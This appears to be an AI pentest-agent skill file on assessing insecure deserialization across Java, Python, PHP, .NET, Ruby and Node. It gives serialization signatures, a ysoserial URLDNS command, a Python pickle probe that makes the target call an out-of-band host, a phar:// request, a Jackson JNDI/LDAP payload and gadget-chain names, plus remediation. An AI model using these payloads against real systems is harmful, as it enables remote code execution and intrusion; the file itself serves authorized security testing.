---
name: web-deserialization-gadget-abuse
description: Insecure deserialization assessment, identifying serialized streams (Java, Python, PHP, .NET, Ruby, Node), gadget chain construction, and safe detection methods.
---

# Insecure Deserialization & Object Injection Assessment

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified target endpoints accepting serialized object formats in `.hacker-harness/scope.yaml`.
- **Target Formats:** Cookies, hidden inputs, API body payloads containing Base64 or binary serialized objects.
- **Traffic Routing:** Route all test payloads through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Identifying Serialized Signatures in Data Streams
Inspect cookies, tokens, and payloads for magic bytes and signatures:
- **Java Serialization:** Hex `AC ED 00 05` or Base64 prefix `rO0AB...`
- **Python Pickle:** Hex `\x80\x03` or `\x80\x04`, `cos\nsystem...`
- **PHP Serialized Object:** String format `O:4:"User":2:{s:4:"name";s:5:"admin";...}` or `a:2:{...}`
- **.NET BinaryFormatter:** Hex `00 01 00 00 00 FF FF FF FF` or Base64 `AAEAAAD/////`
- **Ruby Marshal:** Hex `\x04\x08o...` or Base64 `BAhv...`
- **Node.js Serialization (`node-serialize`):** `{"rce":"_$$ND_FUNC$$_function (){...}()"}`

### Step 2: Safe Detection & Out-of-Band (OOB) Verification
Before executing code, verify deserialization execution safely via DNS lookup or URL connection:
1. **Java (URLDNS Gadget):**
   - The `URLDNS` gadget chain in `ysoserial` triggers a `java.net.URL.hashCode()` DNS query without executing OS commands or depending on specific third-party libraries.
   ```bash
   java -jar ysoserial.jar URLDNS "http://{{ oob_domain }}" | base64
   ```
2. **Python Pickle (Safe OOB probe):**
   ```python
   import pickle, base64, urllib.request
   class Probe:
       def __reduce__(self):
           return (urllib.request.urlopen, ("http://{{ oob_domain }}/pickle-probe",))
   print(base64.b64encode(pickle.dumps(Probe())).decode())
   ```
3. **PHP Phar Deserialization:**
   - Triggering file operations (`file_exists()`, `is_dir()`, `file_get_contents()`) on attacker-controlled `phar://` URIs:
   ```http
   GET /api/v1/avatar?file=phar:///tmp/uploads/avatar.jpg HTTP/1.1
   Host: target.example.com
   ```

### Step 3: Gadget Chain Execution (CommonsCollections, Spring, etc.)
When the runtime library classpath is identified:
- **Java:** `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1/2`, `Jackson` (Default Typing), `Fastjson`.
- **.NET:** `TypeConfuseDelegate`, `ObjectDataProvider`, `ActivitySurrogateSelector`.

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Runtime Context | Vulnerability Root Cause | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Spring Boot Session Cookie** | Base64 Java serialized `remember-me` token | Replace token with `URLDNS` / `CommonsCollections` payload | DNS query to collaborator / command execution |
| **PHP PDF Generator with Avatar** | `file_get_contents($avatar_path)` with `phar://` | Upload valid JPG containing injected Phar metadata | PHP Object injection triggers `__destruct()` magic method |
| **Python Celery / Redis Task Queue** | Worker uses `pickle.loads()` on queue messages | Push pickle payload to Redis queue | Immediate worker RCE |
| **Jackson JSON Polymorphic Deserialization** | `enableDefaultTyping()` with `@class` property | `POST {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://..."}` | JNDI lookup / RCE via LDAP reference |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP request containing the serialized payload and the collaborator DNS log or harmless command output (e.g. `whoami`).
2. **Impact Proof:** Use non-destructive verification chains (`URLDNS`, sleep delay, or DNS ping) to prove code execution without modifying server state.
3. **Remediation:** Avoid using binary serialization formats for untrusted user input (use JSON / Protocol Buffers), disable polymorphic type handling in JSON libraries, and enforce strict class allowlisting (e.g. Java `ObjectInputFilter`).
